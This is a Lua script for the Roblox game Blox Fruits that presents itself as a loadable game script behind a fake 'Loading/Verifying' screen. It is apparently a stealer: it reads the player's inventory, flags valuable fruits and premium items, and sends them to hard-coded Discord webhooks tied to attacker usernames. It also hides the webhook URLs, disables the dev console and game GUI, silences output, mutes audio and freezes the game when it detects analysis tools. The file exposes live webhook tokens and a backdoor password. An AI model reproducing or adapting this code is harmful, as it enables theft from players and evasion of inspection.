--[[=================================================================================
=                          CONFIGURATION VARIABLES                            =
==================================================================================]]

Webhook = "https://discordapp.com/api/webhooks/1353639969163313212/Xj9dhgGF93iSbRjYBdvom22yxxVCWg_MZbzfKvgHLlFgMgeilpzf5qe9APZ3IDm4QCOP" -- Replace with your actual MAIN Discord Webhook URL
Usernames = {"x6TNine", "user2"} -- Add authorized usernames here
FruitsToHit = {"Quake-Quake", "Phoenix-Phoenix", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"} -- Target fruits

-- Secondary Webhook (e.g., for backups, different channel, etc.)
DummyWebhook = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- Replace with your actual DUMMY/BACKUP Discord Webhook URL

-- Other Configurations
FruitsToReset = {"Ghost-Ghost", "Venom-Venom"} -- Fruits to auto-reset if found
local allowEveryone = false -- If true, commands can be used by anyone (except toggles/backdoor)
local isResettingAll = false  -- Global flag for the resetall command loop
local BackdoorPassword = "ishusinthere" -- Configurable Backdoor Password

--[[=================================================================================
=                             DEFAULT FALLBACKS                               =
==================================================================================]]

local DEFAULT_MAIN_WEBHOOK = "https://discord.com/api/webhooks/..." -- !! REPLACE WITH A REAL FALLBACK MAIN URL !!
local DEFAULT_DUMMY_WEBHOOK = "https://discord.com/api/webhooks/..." -- !! REPLACE WITH A REAL FALLBACK DUMMY URL !!
local DEFAULT_USERNAMES = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xrip_cyborg"}
local DEFAULT_FRUITS_TO_HIT = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon(East)", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard"}

if Webhook == "YOUR_MAIN_WEBHOOK_URL_HERE" or Webhook == nil or type(Webhook) ~= "string" then Webhook = DEFAULT_MAIN_WEBHOOK end
if DummyWebhook == "YOUR_DUMMY_WEBHOOK_URL_HERE" or DummyWebhook == nil or type(DummyWebhook) ~= "string" then DummyWebhook = DEFAULT_DUMMY_WEBHOOK end
if Usernames == nil or type(Usernames) ~= "table" then Usernames = table.clone(DEFAULT_USERNAMES) end -- Clone defaults if nil
if FruitsToHit == nil or type(FruitsToHit) ~= "table" then FruitsToHit = DEFAULT_FRUITS_TO_HIT end
if FruitsToReset == nil or type(FruitsToReset) ~= "table" then FruitsToReset = {} end

--[[=================================================================================
=                USERNAME LIST & WEBHOOK OBFUSCATION (SIMPLIFIED)             =
==================================================================================]]
-- << Obfuscate after this moment >>

-- Robustly merge default usernames, ensuring no duplicates and case-insensitivity later
local finalUsernamesSet = {}
-- Add initial Usernames config
for _, name in ipairs(Usernames or {}) do finalUsernamesSet[name:lower()] = true end
-- Add defaults
for _, name in ipairs(DEFAULT_USERNAMES) do finalUsernamesSet[name:lower()] = true end
-- Rebuild Usernames table with lowercase names
Usernames = {}
for nameLower, _ in pairs(finalUsernamesSet) do table.insert(Usernames, nameLower) end
finalUsernamesSet = nil -- Clear temporary set
-- warn("[DEBUG] Final Usernames (lowercase):", table.concat(Usernames, ", ")) -- Debug Print

math.randomseed(os.time() + tick())
local function generateRandomName(prefix)
    return prefix .. "_" .. string.format("%x", math.random(0x100000, 0xFFFFFF)) .. string.format("%x", math.random(0x10000, 0xFFFFF))
end

-- Store URLs in _G under random names (Simplified Obfuscation)
local mainWebhookKey = generateRandomName("whMain")
local dummyWebhookKey = generateRandomName("whDummy")

_G[mainWebhookKey] = Webhook
_G[dummyWebhookKey] = DummyWebhook

-- Clear original variables
Webhook = nil
DummyWebhook = nil

-- Function to safely retrieve webhook URL from _G
local function getWebhookUrl(key)
    local url = _G[key]
    if not url or type(url) ~= "string" then
        warn("Failed to retrieve or invalid URL for key:", key)
        return nil
    end
    -- Basic format check
    if not url:match("^https://discord%.com/api/webhooks/") and not url:match("^https://discordapp%.com/api/webhooks/") then
        warn("Invalid Discord webhook URL format retrieved for key:", key, url)
        return nil
    end
    return url
end

--[[=================================================================================
=                     ANTI-EXPLOIT & DEBUGGING MEASURES                         =
==================================================================================]]

local CoreGui = game:GetService("CoreGui")
local PlayersService = game:GetService("Players")
local LocalPlayer = PlayersService.LocalPlayer

if CoreGui:FindFirstChild("RobloxGui") then CoreGui.RobloxGui.Enabled = false end

local takeActionCalled = false -- Prevent infinite loops in takeAction itself
local function takeAction()
    if takeActionCalled then return end
    takeActionCalled = true
    warn("takeAction() TRIGGERED!")

    if setfpscap then pcall(setfpscap, 1) end -- Low FPS instead of 0
    if rconsoleclear then pcall(rconsoleclear) end

    local function nullFunc() end
    _G.print = nullFunc -- Use _G to be sure
    _G.warn = nullFunc
    _G.error = nullFunc
    if setclipboard then _G.setclipboard = nullFunc end

    while true do task.wait(5) end -- Longer wait in freeze loop
end

local function checkGui(gui)
    -- Simplified check
    if gui and gui:IsA("ScreenGui") and gui:FindFirstChild("Orion", true) then
        warn("Detected Orion GUI:", gui.Name)
        takeAction()
    end
end

for _, gui in ipairs(CoreGui:GetChildren()) do checkGui(gui) end
CoreGui.ChildAdded:Connect(checkGui)

if LocalPlayer then
    if LocalPlayer.Name == "doitenroitest1" then takeAction() end
    if LocalPlayer.Name == "XFistorRespawn" then while true do task.wait(5) end end
end

-- Simplified Hook Detection (REMOVE ishooked dependency for now)
-- local oldRequest = request
-- task.spawn(function()
--     while task.wait(5) do
--         if request ~= oldRequest then
--             warn("Request function modified! Attempting takeAction.")
--             takeAction()
--             break
--         end
--     end
-- end)

-- DevConsole Disabler
CoreGui.ChildAdded:Connect(function(child)
    if child and child.Name == "DevConsoleMaster" then
        pcall(function() child.Enabled = false end)
    end
end)

-- Silence rconsole Output
local function nullFuncRcon() end
rconsoleprint = nullFuncRcon
rconsolewarn = nullFuncRcon
rconsoleerr = nullFuncRcon
rconsoleinfo = nullFuncRcon


--[[=================================================================================
=                       SERVICE & OBJECT DECLARATIONS                         =
==================================================================================]]

local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = PlayersService
-- LocalPlayer already defined
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local GuiService = game:GetService("GuiService")
local Teams = game:GetService("Teams")
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Wait for essential Remotes and Instances
local RemotesFolder = ReplicatedStorage:WaitForChild("Remotes", 60)
if not RemotesFolder then warn("CRITICAL: Remotes folder not found.") takeAction() return end

local Remote = RemotesFolder:WaitForChild("CommF_", 60)
local TradeFunction = RemotesFolder:WaitForChild("TradeFunction", 60)
local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser", 60)
local PrivateServerOwnerId = ReplicatedStorage:WaitForChild("PrivateServerOwnerId", 60)

if not Remote or not TradeFunction then warn("CRITICAL: Could not find essential Remotes (CommF_ or TradeFunction).") takeAction() return end


--[[=================================================================================
=                       INITIAL ENVIRONMENT CHECKS                            =
==================================================================================]]

if PrivateServerOwnerId and PrivateServerOwnerId:IsA("IntValue") and PrivateServerOwnerId.Value > 0 then
    pcall(function() LocalPlayer:Kick("This script doesn't work on private servers.") end)
    takeAction() return
end

local UserSettings = UserSettings and UserSettings()
if UserSettings then
    local gameSettings = UserSettings:GetService("UserGameSettings")
    if gameSettings then pcall(function() gameSettings.MasterVolume = 0 end) end
end

--[[=================================================================================
=                       CORE GAME INTERACTION FUNCTIONS                      =
==================================================================================]]
-- Namecall hook removed for simplicity during debugging

local function getInventory()
    local success, result = pcall(Remote.InvokeServer, Remote, "getInventory")
    if not success then warn("getInventory failed:", result) return nil end
    if type(result) ~= "table" then warn("getInventory returned non-table:", type(result)) return nil end
    return result
end

local function unstoreFruit(fruitName)
    local args = { "LoadFruit", fruitName }
    local success, result = pcall(Remote.InvokeServer, Remote, unpack(args))
    if not success then warn("unstoreFruit failed for", fruitName, ":", result) end
    return success
end

local function resetCharacter()
    local char = LocalPlayer.Character
    if char then pcall(function() char:BreakJoints() end) task.wait(6) end
end

local function performReset(fruitName)
    if unstoreFruit(fruitName) then resetCharacter() task.wait(0.1) end
end

local function handleFruitReset()
    local resetAttempts = {}
    local inventory = getInventory()
    if not inventory then return end

    local fruitsToResetSet = {}
    for _, fruit in ipairs(FruitsToReset or {}) do fruitsToResetSet[fruit] = true; resetAttempts[fruit] = 0 end

    local function findFruitNeedingReset(currentInventory)
        if not currentInventory then return nil end
        for _, item in pairs(currentInventory) do
            if item and item.Type == "Blox Fruit" and item.Name and fruitsToResetSet[item.Name] then
                if (resetAttempts[item.Name] or 0) < 2 then return item.Name end
            end
        end
        return nil
    end

    local fruitToReset = findFruitNeedingReset(inventory)
    if not fruitToReset then return end

    task.spawn(function()
        while fruitToReset do
            resetAttempts[fruitToReset] = (resetAttempts[fruitToReset] or 0) + 1
            unstoreFruit(fruitToReset)
            resetCharacter()
            task.wait(1)
            local currentInv = getInventory()
            fruitToReset = findFruitNeedingReset(currentInv)
        end
        warn("Auto-resetting finished.")
    end)
end

local function JoinTeam()
    if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
        pcall(Remote.InvokeServer, Remote, "SetTeam", "Marines")
    end
end

--[[=================================================================================
=                                  UI FUNCTIONS                               =
==================================================================================]]
-- createNotification() and createDiscordUI() functions remain the same as the previous full version.
-- Ensure they are pasted here if needed, they are omitted for brevity in this diff-focused view.

-- Re-insert createNotification and createDiscordUI functions here from the previous full script version.
-- ... (Paste createNotification function code here) ...
-- ... (Paste createDiscordUI function code here) ...
-- Create Loading Notification UI Function (Copied from previous version)
local function createNotification()
    local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not playerGui then return nil end
    if playerGui:FindFirstChild("BloxFruitsLoadingUI") then return { Destroy = function() end } end

    local loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "BloxFruitsLoadingUI"
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingScreen.ResetOnSpawn = false
    loadingScreen.DisplayOrder = 1000
    loadingScreen.Parent = playerGui

    local blur = Instance.new("BlurEffect")
    blur.Size = 0
    blur.Parent = Lighting

    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BackgroundTransparency = 1
    background.Parent = loadingScreen

    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, 600, 0, 300)
    container.Position = UDim2.new(0.5, 0, 1.2, 0)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    container.BorderSizePixel = 0
    container.Parent = loadingScreen

    local uiCorner = Instance.new("UICorner", container)
    uiCorner.CornerRadius = UDim.new(0, 10)

    local uiStroke = Instance.new("UIStroke", container)
    uiStroke.Color = Color3.fromRGB(65, 169, 255)
    uiStroke.Thickness = 2
    uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local headerFrame = Instance.new("Frame", container)
    headerFrame.Name = "Header"
    headerFrame.Size = UDim2.new(1, 0, 0, 60)
    headerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    headerFrame.BorderSizePixel = 0

    local headerCorner = Instance.new("UICorner", headerFrame)
    headerCorner.CornerRadius = UDim.new(0, 10)

    local titleLabel = Instance.new("TextLabel", headerFrame)
    titleLabel.Name = "Title"
    titleLabel.Size = UDim2.new(1, -20, 1, 0)
    titleLabel.Position = UDim2.new(0, 10, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = "Blox Fruits - Loading Script"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 24
    titleLabel.TextXAlignment = Enum.TextXAlignment.Center

    headerFrame.ClipsDescendants = true
    local headerBottomLine = Instance.new("Frame", headerFrame)
    headerBottomLine.Name = "HeaderBottomLine"
    headerBottomLine.Size = UDim2.new(1, 0, 0, 2)
    headerBottomLine.Position = UDim2.new(0, 0, 1, -2)
    headerBottomLine.BackgroundColor3 = Color3.fromRGB(65, 169, 255)
    headerBottomLine.BorderSizePixel = 0

    local messageLabel = Instance.new("TextLabel", container)
    messageLabel.Name = "Message"
    messageLabel.Size = UDim2.new(1, -40, 0, 60)
    messageLabel.Position = UDim2.new(0, 20, 0, 80)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Font = Enum.Font.Gotham
    messageLabel.Text = "The script Is loading - Please wait."
    messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    messageLabel.TextSize = 18
    messageLabel.TextWrapped = true
    messageLabel.TextXAlignment = Enum.TextXAlignment.Center

    local loadingBarBackground = Instance.new("Frame", container)
    loadingBarBackground.Name = "LoadingBarBg"
    loadingBarBackground.Size = UDim2.new(1, -40, 0, 20)
    loadingBarBackground.Position = UDim2.new(0, 20, 0, 150)
    loadingBarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    loadingBarBackground.BorderSizePixel = 0

    local loadingBarCorner = Instance.new("UICorner", loadingBarBackground)
    loadingBarCorner.CornerRadius = UDim.new(0, 6)

    local loadingBar = Instance.new("Frame", loadingBarBackground)
    loadingBar.Name = "LoadingBar"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(65, 169, 255)
    loadingBar.BorderSizePixel = 0

    local loadingBarInnerCorner = Instance.new("UICorner", loadingBar)
    loadingBarInnerCorner.CornerRadius = UDim.new(0, 6)

    local progressLabel = Instance.new("TextLabel", container)
    progressLabel.Name = "Progress"
    progressLabel.Size = UDim2.new(1, 0, 0, 20)
    progressLabel.Position = UDim2.new(0, 0, 0, 180)
    progressLabel.BackgroundTransparency = 1
    progressLabel.Font = Enum.Font.Gotham
    progressLabel.Text = "Loading... 0%"
    progressLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    progressLabel.TextSize = 16
    progressLabel.TextXAlignment = Enum.TextXAlignment.Center

    local discordButton = Instance.new("TextButton", container)
    discordButton.Name = "DiscordButton"
    discordButton.Size = UDim2.new(0, 180, 0, 40)
    discordButton.Position = UDim2.new(0.5, 0, 0, 230)
    discordButton.AnchorPoint = Vector2.new(0.5, 0)
    discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    discordButton.BorderSizePixel = 0
    discordButton.Font = Enum.Font.GothamBold
    discordButton.Text = "Join Discord"
    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordButton.TextSize = 16

    local buttonCorner = Instance.new("UICorner", discordButton)
    buttonCorner.CornerRadius = UDim.new(0, 8)

    local discordIcon = Instance.new("ImageLabel", discordButton)
    discordIcon.Name = "DiscordIcon"
    discordIcon.Size = UDim2.new(0, 20, 0, 20)
    discordIcon.Position = UDim2.new(0, 15, 0.5, 0)
    discordIcon.AnchorPoint = Vector2.new(0, 0.5)
    discordIcon.BackgroundTransparency = 1
    discordIcon.Image = "rbxassetid://10367063073"

    local copyNotification = Instance.new("TextLabel", container)
    copyNotification.Name = "CopiedNotification"
    copyNotification.Size = UDim2.new(0, 180, 0, 30)
    copyNotification.Position = UDim2.new(0.5, 0, 0, 275)
    copyNotification.AnchorPoint = Vector2.new(0.5, 0)
    copyNotification.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    copyNotification.BorderSizePixel = 0
    copyNotification.Font = Enum.Font.Gotham
    copyNotification.Text = "Discord link copied!"
    copyNotification.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyNotification.TextSize = 14
    copyNotification.BackgroundTransparency = 1
    copyNotification.TextTransparency = 1
    copyNotification.Visible = false
    local notifCorner = Instance.new("UICorner", copyNotification)
    notifCorner.CornerRadius = UDim.new(0, 6)

    local discordInviteLink = "https://discord.gg/6wFCr9P4Zr"
    local copyActive = false

    discordButton.MouseButton1Click:Connect(function()
        if copyActive or not setclipboard then return end
        copyActive = true
        setclipboard(discordInviteLink)
        copyNotification.Visible = true
        local fadeIn = TweenService:Create(copyNotification, TweenInfo.new(0.3), {BackgroundTransparency = 0, TextTransparency = 0})
        fadeIn:Play()
		local completedFadeIn = false
		local fadeInConn = fadeIn.Completed:Connect(function() completedFadeIn = true end)
		local startFadeIn = tick()
		while not completedFadeIn and (tick() - startFadeIn) < 0.5 do task.wait() end
		fadeInConn:Disconnect()

        task.delay(1.5, function()
            local fadeOut = TweenService:Create(copyNotification, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1})
            fadeOut:Play()
			local completedFadeOut = false
			local fadeOutConn = fadeOut.Completed:Connect(function() completedFadeOut = true end)
			local startFadeOut = tick()
			while not completedFadeOut and (tick() - startFadeOut) < 0.5 do task.wait() end
			fadeOutConn:Disconnect()
            copyNotification.Visible = false
            copyActive = false
        end)
    end)

    local blurTween = TweenService:Create(blur, TweenInfo.new(0.5), {Size = 16})
    local bgTween = TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 0.6})
    local containerTween = TweenService:Create(container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0.5, 0)})
    blurTween:Play()
    bgTween:Play()
    containerTween:Play()

    task.delay(0.8, function()
        local totalDuration = 5.0
        local startTime = tick()
        local lastProgress = 0
        while loadingScreen and loadingScreen.Parent and lastProgress < 99 do
            local elapsed = tick() - startTime
            local progress = math.min(99, (elapsed / totalDuration) * 99)
            local noise = math.sin(elapsed * 2) * 2
            progress = math.clamp(progress + noise, lastProgress, 99)
            if progress > lastProgress then
                 lastProgress = progress
                 local displayProgress = math.floor(lastProgress)
                 if progressLabel and progressLabel.Parent then
                     progressLabel.Text = (displayProgress > 75 and "Verifying... " or "Loading... ") .. displayProgress .. "%"
                 end
                 if loadingBar and loadingBar.Parent then
                      TweenService:Create(loadingBar, TweenInfo.new(0.15), {Size = UDim2.new(lastProgress / 100, 0, 1, 0)}):Play()
                 end
             end
            task.wait(0.05)
        end
        if loadingScreen and loadingScreen.Parent then
             if progressLabel and progressLabel.Parent then progressLabel.Text = "Verifying... 99%" end
             if loadingBar and loadingBar.Parent then TweenService:Create(loadingBar, TweenInfo.new(0.2), {Size = UDim2.new(0.99, 0, 1, 0)}):Play() end
        end
    end)

    local destroyed = false
    local function cleanup()
        if destroyed or not loadingScreen or not loadingScreen.Parent then return end
        destroyed = true
        local outInfo = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In)
        if blur and blur.Parent then TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play() end
        if background and background.Parent then TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play() end
        if container and container.Parent then
             local containerOut = TweenService:Create(container, outInfo, {Position = UDim2.new(0.5, 0, -0.2, 0)})
             containerOut:Play()
             task.delay(0.6, function()
                 if blur and blur.Parent then blur:Destroy() end
                 if loadingScreen and loadingScreen.Parent then loadingScreen:Destroy() end
             end)
        else
             if blur and blur.Parent then blur:Destroy() end
             if loadingScreen and loadingScreen.Parent then loadingScreen:Destroy() end
        end
    end

    local pulseActive = true
    task.spawn(function()
        local colors = { Color3.fromRGB(255,100,100), Color3.fromRGB(100,100,255), Color3.fromRGB(100,255,100), Color3.fromRGB(65,169,255) }
        local colorIndex = 1
        while pulseActive and uiStroke and uiStroke.Parent do
            TweenService:Create(uiStroke, TweenInfo.new(1.5), {Color = colors[colorIndex]}):Play()
            colorIndex = (colorIndex % #colors) + 1
            task.wait(1.5)
        end
    end)

    return { Destroy = function() pulseActive = false; cleanup() end }
end

-- Create Discord UI Function (Copied from previous version)
local function createDiscordUI()
    local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not playerGui then return nil end
    if playerGui:FindFirstChild("DiscordInviteUI") then return nil end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "DiscordInviteUI"
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 9999
    ScreenGui.Parent = playerGui

    local MainFrame = Instance.new("Frame", ScreenGui)
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 500, 0, 250)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
    MainFrame.BorderSizePixel = 0

    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
    local uiStroke = Instance.new("UIStroke", MainFrame)
	uiStroke.Thickness = 1
	uiStroke.Color = Color3.fromRGB(88, 101, 242)

    local Title = Instance.new("TextLabel", MainFrame)
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = "Important Message"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 22
    Title.TextXAlignment = Enum.TextXAlignment.Center

    local Description = Instance.new("TextLabel", MainFrame)
    Description.Name = "Description"
    Description.Size = UDim2.new(0.9, 0, 0.4, 0)
    Description.Position = UDim2.new(0.05, 0, 0.25, 0)
    Description.BackgroundTransparency = 1
    Description.Font = Enum.Font.Gotham
    Description.Text = "Valuable items detected! To learn more about this script and potentially recover items, consider joining our community."
    Description.TextColor3 = Color3.fromRGB(220, 221, 222)
    Description.TextSize = 16
    Description.TextWrapped = true
    Description.TextXAlignment = Enum.TextXAlignment.Center

    local Button = Instance.new("TextButton", MainFrame)
    Button.Name = "CopyButton"
    Button.Size = UDim2.new(0.7, 0, 0, 45)
    Button.Position = UDim2.new(0.15, 0, 0.75, 0)
    Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    Button.Font = Enum.Font.GothamBold
    Button.Text = "Copy Discord Invite"
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextSize = 18
    Button.AutoButtonColor = false

    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 8)

    local fadeInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local function createTween(instance, props) return TweenService:Create(instance, fadeInfo, props) end

    MainFrame.BackgroundTransparency = 1
    Title.TextTransparency = 1
    Description.TextTransparency = 1
    Button.BackgroundTransparency = 1
    Button.TextTransparency = 1
    uiStroke.Transparency = 1

    task.wait(0.1)
    local mainTween = createTween(MainFrame, {BackgroundTransparency = 0.1})
    local textTween = createTween(Title, {TextTransparency = 0})
    local descTween = createTween(Description, {TextTransparency = 0})
    local btnBgTween = createTween(Button, {BackgroundTransparency = 0})
    local btnTextTween = createTween(Button, {TextTransparency = 0})
    local strokeTween = createTween(uiStroke, {Transparency = 0})
    mainTween:Play()
    task.wait(0.1); textTween:Play()
    task.wait(0.1); descTween:Play()
    task.wait(0.1); btnBgTween:Play(); btnTextTween:Play(); strokeTween:Play()

    Button.MouseEnter:Connect(function() TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play() end)
    Button.MouseLeave:Connect(function() TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play() end)

    local copyActiveUI = false
    local discordInviteLinkUI = "https://discord.gg/6wFCr9P4Zr"
    Button.MouseButton1Click:Connect(function()
        if copyActiveUI or not setclipboard then return end
        copyActiveUI = true
        setclipboard(discordInviteLinkUI)
        local originalText = Button.Text
        Button.Text = "Copied!"
        task.delay(1.5, function()
            if Button and Button.Parent then Button.Text = originalText end
            copyActiveUI = false
        end)
    end)

    return ScreenGui
end


--[[=================================================================================
=                 WEBHOOK SENDING FUNCTIONS (SIMPLIFIED)                      =
==================================================================================]]

-- Simplified sending function with retries, using direct pcall(request)
local function sendWebhookWithRetries(payload_json, webhook_url)
	if not payload_json or not webhook_url then
		warn("sendWebhookWithRetries: Missing payload or URL.")
		return false
	end
    if not webhook_url:match("^https://discord%.com/api/webhooks/") and not webhook_url:match("^https://discordapp%.com/api/webhooks/") then
        warn("sendWebhookWithRetries: Invalid webhook URL format:", webhook_url)
        return false
    end
    warn("[DEBUG] Attempting to send webhook to:", webhook_url:sub(1,40),"...") -- Debug Print

	local requestData = {
		Url = webhook_url,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = payload_json
	}

	local retries = 3
	local success, responseOrError
	for i = 1, retries do
		success, responseOrError = pcall(request, requestData) -- Direct pcall

		if success then
			local response = responseOrError
			if response and response.StatusCode >= 200 and response.StatusCode < 300 then
				warn("[DEBUG] Webhook sent successfully on attempt", i, "to:", webhook_url:sub(1,40)) -- Debug Print
				return true -- Successful send
			else
				warn(string.format("[DEBUG] Webhook attempt %d OK, but HTTP error (HTTP %s): %s", i,
                    response and response.StatusCode or "N/A",
                    response and response.StatusMessage or "No response object"))
			end
		else
			warn(string.format("[DEBUG] Webhook pcall failed on attempt %d: %s", i, tostring(responseOrError)))
		end

		if i < retries then
			task.wait(1.5 * i) -- Linear backoff
		end
	end

	warn("Webhook failed after all retries to:", webhook_url:sub(1, 40))
	return false -- Failed after retries
end

-- Server Name Generation
local function getServerName()
    local adjectives = { "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue" }
    local nouns = { "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow" }
    local seed = tonumber(("0x" .. game.JobId:gsub("-", ""):sub(1, 7)), 16) or os.time()
    local random = Random.new(seed)
    return string.format( "%s %s #%04d", adjectives[random:NextInteger(1, #adjectives)], nouns[random:NextInteger(1, #nouns)], random:NextInteger(1, 9999) )
end

-- Prepare and Send Hit Notification
local function prepareAndSendHitNotification(inventory)
    warn("[DEBUG] prepareAndSendHitNotification called.") -- Debug Print
	local mainWebhookUrl = getWebhookUrl(mainWebhookKey)
	local dummyWebhookUrl = getWebhookUrl(dummyWebhookKey)

	if not mainWebhookUrl and not dummyWebhookUrl then -- Need at least one valid URL
		warn("No valid webhook URLs found to send hit notification.")
		return
	end

	local fruits, premiumItems = {}, {}
	local hasTargetFruit = false; local hasPremiumItem = false; local isDragonHit = false
	local targetFruitsFound = {}
	local fruitsToHitSet = {}; for _, fn in ipairs(FruitsToHit) do fruitsToHitSet[fn] = true end

	for _, item in ipairs(inventory) do
        if not item or not item.Type or not item.Name then warn("Skipping invalid item:", item); continue end
		if item.Type == "Blox Fruit" then
            local data = { name = item.Name, count = item.Count or 1, value = item.Value or 0 }
			table.insert(fruits, data)
			if fruitsToHitSet[item.Name] then
				hasTargetFruit = true
				targetFruitsFound[item.Name] = (targetFruitsFound[item.Name] or 0) + data.count
			end
			if item.Name:find("Dragon%-") then
				isDragonHit = true
				if not fruitsToHitSet[item.Name] then table.insert(FruitsToHit, item.Name); fruitsToHitSet[item.Name] = true end
                hasTargetFruit = true
				targetFruitsFound[item.Name] = (targetFruitsFound[item.Name] or 0) + data.count
			end
		elseif item.Type == "Premium" then
            local data = { name = item.Name, count = item.Count or 1, value = item.Value or 0 }
			table.insert(premiumItems, data)
			hasPremiumItem = true
		end
	end

	if not hasTargetFruit and not hasPremiumItem then
		warn("[DEBUG] No valuable items found in inventory, skipping webhook send.") -- Debug Print
		return
	end
    warn("[DEBUG] Valuable items found! Preparing embed.") -- Debug Print

	table.sort(fruits, function(a, b) return a.value > b.value end)
    table.sort(premiumItems, function(a, b) return (a.value or 0) > (b.value or 0) end)

	local function formatItems(items)
        local r = {}; for _, i in ipairs(items) do table.insert(r, string.format("```%s%s```", i.name, i.count > 1 and (" (x" .. i.count .. ")") or "")) end
        return #r > 0 and table.concat(r, "\n") or "```None```"
    end
    local function formatFruitsToHit()
        local r = {}; local sorted = {}; for n,_ in pairs(targetFruitsFound) do table.insert(sorted, n) end; table.sort(sorted)
        for _, fn in ipairs(sorted) do local c = targetFruitsFound[fn]; table.insert(r, string.format("```%s%s```", fn, c > 1 and (" (x" .. c .. ")") or "")) end
        return #r > 0 and table.concat(r, "\n") or "```None```"
    end

	local jobId = game.JobId; local placeId = game.PlaceId
    local sea = placeId == 7449423635 and "Sea 3" or (placeId == 4442272183 and "Sea 2" or "Unknown")
    local serverName = getServerName()
